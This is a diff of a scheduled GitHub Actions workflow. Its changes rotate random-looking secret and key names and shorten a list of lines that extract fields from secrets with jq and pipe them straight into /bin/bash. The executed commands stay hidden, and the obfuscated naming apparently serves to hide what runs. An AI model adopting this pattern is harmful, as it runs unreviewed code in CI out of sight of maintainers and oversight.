@@ -2,7 +2,7 @@ name: chenseqing6751
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
+    - cron: '26 4/6 * * *'
 
 jobs:
   build:
@@ -12,15 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: chenseqing6751
         env:
-          sc65735: ${{ secrets.sc65735 }}
+          dmkik1031: ${{ secrets.dmkik1031 }}
         run: |
-          echo $sc65735 | jq -r .pd67970 | /bin/bash
-          echo $wlflb27516 | jq -r .yhls0925 | /bin/bash
-          echo $qjhs0 | jq -r .tsfef9 | /bin/bash
-          echo $rd05905 | jq -r .q1 | /bin/bash
-          echo $p63725 | jq -r .zwg1 | /bin/bash
-          echo $gdu2 | jq -r .oniml3 | /bin/bash
-          echo $td66144 | jq -r .gm2 | /bin/bash
-          echo $imv8372 | jq -r .x55827 | /bin/bash
-          echo $bvn11 | jq -r .otlb38501 | /bin/bash
+          echo $dmkik1031 | jq -r .z0194 | /bin/bash
+          echo $oq0 | jq -r .ewtuc5309 | /bin/bash
+          echo $f96793 | jq -r .ua6 | /bin/bash
+          echo $ndqev86 | jq -r .i1969 | /bin/bash
+          echo $rek627 | jq -r .rrwa4 | /bin/bash
 
